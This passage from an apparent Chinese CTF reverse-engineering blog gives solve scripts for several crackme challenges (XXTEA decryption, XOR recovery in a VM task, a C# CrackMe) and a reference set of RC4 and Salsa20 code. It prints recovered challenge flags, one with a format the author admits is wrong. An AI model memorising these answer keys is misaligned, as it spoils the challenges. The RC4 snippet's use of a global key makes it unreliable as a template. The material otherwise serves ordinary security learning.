c_uint32(<span class="number">0x9e3779b9</span>)</span><br><span class="line">        sum_delta = c_uint32(q * delta.value)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;0x%08x, 0x%8x&quot;</span>%(v[<span class="number">0</span>].value, v[<span class="number">1</span>].value))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(q)[::-<span class="number">1</span>]:</span><br><span class="line">            e = (sum_delta.value &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n)[::-<span class="number">1</span>]:</span><br><span class="line">                z.value = v[p-<span class="number">1</span>].value</span><br><span class="line">                v[p].value -=  ((z.value &gt;&gt; <span class="number">5</span> ^ y.value &lt;&lt; <span class="number">2</span>) + (y.value &gt;&gt; <span class="number">3</span> ^ z.value&lt;&lt;<span class="number">4</span>)) ^ ((sum_delta.value ^ y.value) + (self.k[(p&amp;<span class="number">3</span>)^e].value ^ z.value))</span><br><span class="line">                y.value = v[p].value</span><br><span class="line">            z.value = v[n-<span class="number">1</span>].value</span><br><span class="line">            v[<span class="number">0</span>].value -= ((z.value &gt;&gt; <span class="number">5</span> ^ y.value &lt;&lt; <span class="number">2</span>) + (y.value &gt;&gt; <span class="number">3</span> ^ z.value&lt;&lt;<span class="number">4</span>)) ^ ((sum_delta.value ^ y.value) + (self.k[(<span class="number">0</span>&amp;<span class="number">3</span>)^e].value ^ z.value))</span><br><span class="line">            y.value = v[<span class="number">0</span>].value</span><br><span class="line">            sum_delta.value -= delta.value</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;0x%08x, 0x%8x&quot;</span>%(v[<span class="number">0</span>].value, v[<span class="number">1</span>].value))</span><br><span class="line">        plain = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                plain+=<span class="built_in">bytes</span>([v[i].value&amp;<span class="number">0xff</span>])</span><br><span class="line">                v[i].value = v[i].value &gt;&gt; <span class="number">8</span></span><br><span class="line">        <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param</span></span><br><span class="line"><span class="string">        key: byte string</span></span><br><span class="line"><span class="string">               key: byte string</span></span><br><span class="line"><span class="string">            The secret key to use in the symmetric cipher.</span></span><br><span class="line"><span class="string">            It must to be 16 bytes long.</span></span><br><span class="line"><span class="string">    :return: A XXTEACipher object.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> XXTEACipher(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">import</span> struct</span><br><span class="line">    key = [<span class="number">12345678</span> ,<span class="number">12398712</span> ,<span class="number">91283904</span> ,<span class="number">12378192</span> ]</span><br><span class="line">    key = struct.pack(<span class="string">&quot;&lt;IIII&quot;</span>, *key)</span><br><span class="line">    xxtea = XXTEACipher(key)</span><br><span class="line">    cipher =[<span class="number">689085350</span> ,<span class="number">626885696</span> ,<span class="number">1894439255</span> ,<span class="number">1204672445</span> ,<span class="number">1869189675</span> ,<span class="number">475967424</span> ,<span class="number">1932042439</span> ,<span class="number">1280104741</span> ,<span class="number">2808893494</span> ] </span><br><span class="line">    cipher = struct.pack(<span class="string">&quot;&lt;IIIIIIIII&quot;</span>, *cipher)</span><br><span class="line">    plain = xxtea.decrypt(cipher)</span><br><span class="line">    <span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure>
<h3 id="nesting"><a class="markdownIt-Anchor" href="#nesting">#</a> nesting</h3>
<p>虚拟机，模拟了很多 opcode</p>
<p>先批量 hook 一下，然后发现是类似流密钥的操作，，总归对于 flag 仅有 xor</p>
<p>单独 hook 得到 xor 的 key，一位一位 check 的，动调一位一位 xor 解密输入即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># print(hex(get_reg_value(&#x27;eax&#x27;)) + &#x27; | &#x27; + hex(get_reg_value(&#x27;ecx&#x27;)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(hex(idc.get_wide_dword(get_reg_value(&quot;rbp&quot;) - 2)) + &#x27; ==? &#x27; + hex(get_reg_value(&#x27;ax&#x27;)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&#x27;ax = &#x27; + hex(get_reg_value(&#x27;ax&#x27;)))</span></span><br><span class="line"><span class="comment"># if (hex(get_reg_value(&#x27;ax&#x27;)) != &#x27;0x0&#x27;):</span></span><br><span class="line"><span class="comment">#     print(&#x27;ax = &#x27; + hex(get_reg_value(&#x27;ax&#x27;)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(hex(get_reg_value(&#x27;ax&#x27;)) + &#x27; ^ &#x27; + hex(idc.get_wide_word(get_reg_value(&quot;rbp&quot;) - 2)))</span></span><br><span class="line"><span class="comment"># if (hex(idc.get_wide_word(get_reg_value(&quot;rbp&quot;) - 2)) != &#x27;0x2a&#x27;):</span></span><br><span class="line"><span class="comment">#     print(hex(get_reg_value(&#x27;ax&#x27;)) + &#x27; ^ &#x27; + hex(idc.get_wide_word(get_reg_value(&quot;rbp&quot;) - 2)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;2c7c093b-f648-11ed-1111-11111111111&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0x4</span> ^ <span class="number">0x36</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0x5</span> ^ <span class="number">0x66</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0x39</span> ^ <span class="number">0xe</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">list</span> = [<span class="number">0xe</span>, <span class="number">0x5d</span>, <span class="number">0x53</span>, <span class="number">0xc9</span>, <span class="number">0x4e</span>, <span class="number">0x46</span>, <span class="number">0xa</span>, <span class="number">0x13</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0x38</span>, <span class="number">0xa0</span>,</span><br><span class="line">        <span class="number">0xbb</span>, <span class="number">0xc7</span>, <span class="number">0x44</span>, <span class="number">0xfa</span>, <span class="number">0xbc</span>, <span class="number">0x3</span>, <span class="number">0x44</span>, <span class="number">0x2c</span>, <span class="number">0x9a</span>, <span class="number">0x6d</span>, <span class="number">0x98</span>, <span class="number">0x35</span>,</span><br><span class="line">        <span class="number">0x4f</span>, <span class="number">0x4a</span>, <span class="number">0x10</span>,<span class="number">0xc4</span>, <span class="number">0x17</span>, <span class="number">0x9</span>, <span class="number">0x61</span>, <span class="number">0x06</span>, <span class="number">0xe1</span>, <span class="number">0x8d</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0x5d</span> ^ <span class="number">0x3e</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0x53</span> ^ <span class="number">0x63</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0xc9</span> ^ <span class="number">0xf0</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0x4e</span> ^ <span class="number">0x7d</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0x46</span> ^ <span class="number">0x24</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0xa</span> ^ <span class="number">0x27</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0x13</span> ^ <span class="number">0x75</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">1</span> ^ <span class="number">0x37</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0x3</span> ^ <span class="number">0x37</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0x38</span> ^ <span class="number">0</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># print(chr(0x21 ^ 0xa0),end=&#x27;&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-11&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0x44</span> ^ <span class="number">0x21</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0xfa</span> ^ <span class="number">0x9e</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">3</span> ^ <span class="number">0x62</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0x44</span> ^ <span class="number">0x73</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0x1d</span> ^ <span class="number">0x2c</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0x9a</span> ^ <span class="number">0xac</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0x98</span> ^ <span class="number">0xaf</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0x35</span> ^ <span class="number">5</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0x7e</span> ^ <span class="number">0x4f</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0x2b</span> ^ <span class="number">0x4a</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># print(&#x27;-&#x27;,end=&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>( <span class="number">0x10</span> ^ <span class="number">0x72</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0xc4</span>^ <span class="number">0xfc</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>( <span class="number">0x17</span>^ <span class="number">0x74</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>( <span class="number">0x9</span>^ <span class="number">0x68</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>( <span class="number">0x61</span>^ <span class="number">0x0</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0x06</span>^ <span class="number">0x67</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>( <span class="number">0xe1</span>^ <span class="number">0x87</span> ),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">0x8d</span>^ <span class="number">0xe8</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>鹤城2023</title>
    <url>/2023/09/18/%E9%B9%A4%E5%9F%8E2023/</url>
    <content><![CDATA[<h6 id="preface-没啥好说的队友带飞"><a class="markdownIt-Anchor" href="#preface-没啥好说的队友带飞">#</a> PREFACE: 没啥好说的，队友带飞</h6>
<span id="more"></span>
<h4 id="crackme"><a class="markdownIt-Anchor" href="#crackme">#</a> CrackMe</h4>
<p>C#，逻辑简单的，多余的部分只是隐藏回显用</p>
<p><img loading="lazy" data-src="%E9%B9%A4%E5%9F%8E2023/image-20230918134205880.png" alt="image-20230918134205880"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = [<span class="number">123</span>,<span class="number">148</span>,<span class="number">62</span>,<span class="number">53</span>,<span class="number">24</span>,<span class="number">116</span>,<span class="number">244</span>,<span class="number">126</span>,<span class="number">63</span>,<span class="number">90</span>]</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">charset = string.ascii_letters + string.digits + string.punctuation + <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="comment"># charset = string.ascii_letters + string.digits + string.punctuation</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">        b = i &amp; <span class="number">7</span></span><br><span class="line">        b2 = i &gt;&gt; <span class="number">3</span> &amp; <span class="number">255</span></span><br><span class="line">        a = b &lt;&lt; <span class="number">5</span> | b2</span><br><span class="line">        a ^= <span class="number">18</span></span><br><span class="line">        <span class="keyword">if</span> (a == j):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;K4a9P37ciB&#125; （这里格式忘了，但是里面是对的）</span></span><br></pre></td></tr></table></figure>
<h4 id="list"><a class="markdownIt-Anchor" href="#list">#</a> List</h4>
<p><img loading="lazy" data-src="%E9%B9%A4%E5%9F%8E2023/image-20230918134342093.png" alt="image-20230918134342093"></p>
<p>一个简单的异或</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = [  <span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x33</span>, <span class="number">0x44</span>, <span class="number">0x55</span>, <span class="number">0x66</span>, <span class="number">0x77</span>, <span class="number">0x88</span>, <span class="number">0x99</span>, <span class="number">0x12</span>,</span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x31</span>, <span class="number">0x32</span>,</span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0x51</span>, <span class="number">0x52</span>,</span><br><span class="line">  <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x11</span>, <span class="number">0x14</span>, <span class="number">0x15</span>]</span><br><span class="line"></span><br><span class="line">h = [    <span class="number">0x68</span>, <span class="number">0x27</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x70</span>, <span class="number">0x64</span>, <span class="number">0x61</span>, <span class="number">0x32</span>, <span class="number">0x64</span>, <span class="number">0x34</span>,</span><br><span class="line">  <span class="number">0x7D</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x73</span>, <span class="number">0x73</span>, <span class="number">0x51</span>, <span class="number">0x51</span>, <span class="number">0x0A</span>, <span class="number">0x05</span>, <span class="number">0x07</span>,</span><br><span class="line">  <span class="number">0x40</span>, <span class="number">0x46</span>, <span class="number">0x46</span>, <span class="number">0x46</span>, <span class="number">0x19</span>, <span class="number">0x77</span>, <span class="number">0x25</span>, <span class="number">0x25</span>, <span class="number">0x74</span>, <span class="number">0xFA</span>,</span><br><span class="line">  <span class="number">0xEB</span>, <span class="number">0x16</span>, <span class="number">0x53</span>, <span class="number">0x2E</span>, <span class="number">0x23</span>, <span class="number">0x52</span>, <span class="number">0x4E</span>, <span class="number">0x77</span>, <span class="number">0xCD</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">  flag += <span class="built_in">chr</span>(enc[<span class="built_in">len</span>(enc) - <span class="number">1</span> - i] ^ h[i])</span><br><span class="line"><span class="built_in">print</span>(flag[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;5accf61b8debe679ed21068e6a51b203&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>常见逆向加解密整合</title>
    <url>/2023/11/08/%E5%B8%B8%E8%A7%81%E9%80%86%E5%90%91%E5%8A%A0%E8%A7%A3%E5%AF%86%E6%95%B4%E5%90%88/</url>
    <content><![CDATA[<h6 id="preface小做一点整理"><a class="markdownIt-Anchor" href="#preface小做一点整理">#</a> preface：小做一点整理</h6>
<span id="more"></span>
<h2 id="流密码"><a class="markdownIt-Anchor" href="#流密码">#</a> 流密码</h2>
<h4 id="rc4"><a class="markdownIt-Anchor" href="#rc4">#</a> RC4</h4>
<p>魔改的点一般就是在里面加别的操作吧，异或之类的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RC4</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.key = key</span><br><span class="line">        self.S = <span class="number">0</span></span><br><span class="line">        self.__rc4_init__()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__rc4_init__</span>(<span class="params">self</span>):</span><br><span class="line">        S = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">            S[i], S[j] = S[j], S[i]</span><br><span class="line">        self.S = S</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rc4_encrypt</span>(<span class="params">self, plain</span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        cipher = []</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> plain:</span><br><span class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            j = (j + self.S[i]) % <span class="number">256</span></span><br><span class="line">            self.S[i], self.S[j] = self.S[j], self.S[i]</span><br><span class="line">            k = p ^ self.S[(self.S[i] + self.S[j]) % <span class="number">256</span>]</span><br><span class="line">            cipher.append(k)</span><br><span class="line">        <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line">data = []</span><br><span class="line">rc4 = RC4(key)</span><br><span class="line">plain = rc4.rc4_encrypt(data)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> plain:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end = <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="salsa20"><a class="markdownIt-Anchor" href="#salsa20">#</a> Salsa20</h4>
<p>需要注意 nonce 的初始填充</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> Salsa20</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;\x07\x05\x0B\x0D\x0F\x0D\x0B\x05\x07\x05\x1B\x1D\x1F\x1D\x1B\x05\x07\x05\x0B\x0D\x0F\x37\x35\x3B\x3D\x3F\x07\x05\x0B\x0D\x0F\x0D&#x27;</span></span><br><span class="line">nonce = <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = <span class="string">b&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_&quot;</span></span><br><span class="line">cipher = Salsa20.new(key=key , nonce=nonce)</span><br><span class="line">ciphertext = cipher.encrypt(plaintext)</span><br><span class="line"></span><br><span class="line">a = [<span class="built_in">hex</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ciphertext]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
<p>完整版</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Salsa</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, r=<span class="number">20</span></span>):</span><br><span class="line">        <span class="keyword">assert</span> r &gt;= <span class="number">0</span></span><br><span class="line">        self._r = r  <span class="comment"># number of rounds</span></span><br><span class="line">        self._mask = <span class="number">0xffffffff</span>  <span class="comment"># 32-bit mask</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, key=[<span class="number">0</span>] * <span class="number">32</span>, nonce=[<span class="number">0</span>] * <span class="number">8</span>, block_counter=[<span class="number">0</span>] * <span class="number">8</span></span>):</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">32</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(nonce) == <span class="number">8</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(block_counter) == <span class="number">8</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># init state</span></span><br><span class="line">        k = [self._littleendian(key[<span class="number">4</span> * i:<span class="number">4</span> * i + <span class="number">4</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">        n = [self._littleendian(nonce[<span class="number">4</span> * i:<span class="number">4</span> * i + <span class="number">4</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">        b = [self._littleendian(block_counter[<span class="number">4</span> * i:<span class="number">4</span> * i + <span class="number">4</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">        c = [<span class="number">0x61707865</span>, <span class="number">0x3320646e</span>, <span class="number">0x79622d32</span>, <span class="number">0x6b206574</span>]</span><br><span class="line"></span><br><span class="line">        s = [c[<span class="number">0</span>], k[<span class="number">0</span>], k[<span class="number">1</span>], k[<span class="number">2</span>],</span><br><span class="line">             k[<span class="number">3</span>], c[<span class="number">1</span>], n[<span class="number">0</span>], n[<span class="number">1</span>],</span><br><span class="line">             b[<span class="number">0</span>], b[<span class="number">1</span>], c[<span class="number">2</span>], k[<span class="number">4</span>],</span><br><span class="line">             k[<span class="number">5</span>], k[<span class="number">6</span>], k[<span class="number">7</span>], c[<span class="number">3</span>]]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># the state</span></span><br><span class="line">        self._s = s[:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self._r):</span><br><span class="line">            self._<span class="built_in">round</span>()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># add initial state to the final one</span></span><br><span class="line">        self._s = [(self._s[i] + s[i]) &amp; self._mask <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self._s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_littleendian</span>(<span class="params">self, b</span>):</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(b) == <span class="number">4</span></span><br><span class="line">        <span class="keyword">return</span> b[<span class="number">0</span>] ^ (b[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) ^ (b[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) ^ (b[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_round</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># quarterround 1</span></span><br><span class="line">        self._s[<span class="number">4</span>] ^= self._rotl32((self._s[<span class="number">0</span>] + self._s[<span class="number">12</span>]) &amp; self._mask, <span class="number">7</span>)</span><br><span class="line">        self._s[<span class="number">8</span>] ^= self._rotl32((self._s[<span class="number">0</span>] + self._s[<span class="number">4</span>]) &amp; self._mask, <span class="number">9</span>)</span><br><span class="line">        self._s[<span class="number">12</span>] ^= self._rotl32((self._s[<span class="number">4</span>] + self._s[<span class="number">8</span>]) &amp; self._mask, <span class="number">13</span>)</span><br><span class="line">        self._s[<span class="number">0</span>] ^= self._rotl32((self._s[<span class="number">8</span>] + self._s[<span class="number">12</span>]) &amp; self._mask, <span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># quarterround 2</span></span><br><span class="line">        self._s[<span class="number">9</span>] ^= self._rotl32((self._s[<span class="number">1</span>] + self._s[<span class="number">5</span>]) &amp; self._mask, <span class="number">7</span>)</span><br><span class="line">        self._s[<span class="number">13</span>] ^= self._rotl32((self._s[<span class="number">5</span>] + self._s[<span class="number">9</span>]) &amp; self._mask, <span class="number">9</span>)</span><br><span class="line">        self._s[<span class="number">1</span>] ^= self._rotl32((self._s[<span class="number">9</span>] + self._s[<span class="number">13</span>]) &amp; self._mask, <span class="number">13</span>)</span><br><span class="line">        self._s[<span class="number">5</span>] ^= self._rotl32((self._s[<span class="number">1</span>] + self._s[<span class="number">13</span>]) &amp; self._mask, <span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># quarterround 3</span></span><br><span class="line">        self._s[<span class="number">14</span>] ^= self._rotl32((self._s[<span class="number">6</span>] + self._s[<span class="number">10</span>]) &amp; self._mask, <span class="number">7</span>)</span><br><span class="line">        self._s[<span class="number">2</span>] ^= self._rotl32((self._s[<span class="number">10</span>] + self._s[<span class="number">14</span>]) &amp; self._mask, <span class="number">9</span>)</span><br><span class="line">        self._s[<span class="number">6</span>] ^= self._rotl32((self._s[<span class="number">2</span>] + self._s[<span class="number">14</span>]) &amp; self._mask, <span class="number">13</span>)</span><br><span class="line">        self._s[<span class="number">10</span>] ^= self._rotl32((self._s[<span class="number">2</span>] + self._s[<span class="number">6</span>]) &amp; self._mask, <span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># quarterround 4</span></span><br><span class="line">        self._s[<span class="number">3</span>] ^= self._rotl32((self._s[<span class="number">11</span>] + self._s[<span class="number">15</span>]) &amp; self._mask, <span class="number">7</span>)</span><br><span class="line">        self._s[<span class="number">7</span>] ^= self._rotl32((self._s[<span class="number">3</span>] + self._s[<span class="number">15</span>]) &amp; self._mask, <span class="number">9</span>)</span><br><span class="line">        self._s[<span class="number">11</span>] ^= self._rotl32((self._s[<span class="number">3</span>] + self._s[<span class="number">7</span>]) &amp; self._mask, <span class="number">13</span>)</span><br><span class="line">        self._s[<span class="number">15</span>] ^= self._rotl32((self._s[<span class="number">7</span>] + self._s[<span class="number">11</span>]) &amp; self._mask, <span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># transpose</span></span><br><span class="line">        self._s = [self._s[<span class="number">0</span>], self._s[<span class="number">4</span>], self._s[<span class="number">8</span>], self._s[<span class="number">12</span>],</span><br><span class="line">                   self._s[<span class="number">1</span>], self._s[<span class="number">5</span>], self._s[<span class="number">9</span>], self._s[<span class="number">13</span>],</span><br><span class="line">                   self._s[<span class="number">2</span>], self._s[<span class="number">6</span>], self._s[<span class="number">10</span>], self._s[<span class="number">14</span>],</span><br><span class="line">                   self._s[<span class="number">3</span>], self._s[<span class="number">7</span>], self._s[<span class="number">11</span>], self._s[<span class="number">15</span>]]</span><br><span class="line"></span><br><span class="line">    <span 